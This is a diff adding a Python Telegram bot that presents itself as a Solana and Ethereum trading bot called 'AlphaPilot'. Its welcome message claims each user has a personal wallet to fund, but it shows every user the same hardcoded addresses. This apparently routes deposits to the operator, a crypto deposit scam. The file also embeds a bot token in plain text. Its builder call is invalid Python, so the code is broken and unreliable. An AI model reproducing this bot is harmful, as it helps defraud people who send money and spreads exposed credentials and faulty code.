@@ -1,0 +1,44 @@
+from telegram import Update, ReplyKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Correct indentation of the `user` variable declaration.
+    user = update.effective_user
+    
+    # Use triple quotes for multiline strings and correct syntax.
+    await update.message.reply_text(
+        """
+Welcome to AlphaPilot trade bot!
+
+Introducing a cutting-edge bot crafted exclusively for Solana Traders. Trade any token instantly right after launch.
+
+Here's your Solana / Ethereum wallet address linked to your Telegram account. Simply fund your wallet and dive into trading.
+
+Solana · 🅴 Bt3Twf5UHGqNQafb5yuJw7q4zzvgddnyRzYFvmNvWJrt
+(Tap to copy)
+Balance: 0.00 SOL
+
+Ethereum · 🅴 0xE62f2338088b3D993Ca43E73C1B28B4b960e568C
+(Tap to copy)
+Balance: 0.00 ETH
+
+Click on the /start button to update your current balance.
+
+💡If you aren't already, we advise that you use any of the following bots to trade with. You will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.
+
+⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.
+        """,
+        reply_markup=ReplyKeyboardMarkup(
+            [['📊 Dashboard', '📈 Prices'], ['📁 Wallets', '⚙️ Settings']],
+            resize_keyboard=True
+        )
+    )
+
+# Instantiate the bot application using your bot token.
+app = ApplicationBuilder(7260465336:AAFMKALL0FIoCKTE60KiJWbRZr7AkJWB5ds).token().build()
+
+# Add the `start` command handler.
+app.add_handler(CommandHandler("start", start))
+
+# Run the bot's polling mechanism.
+app.run_polling()
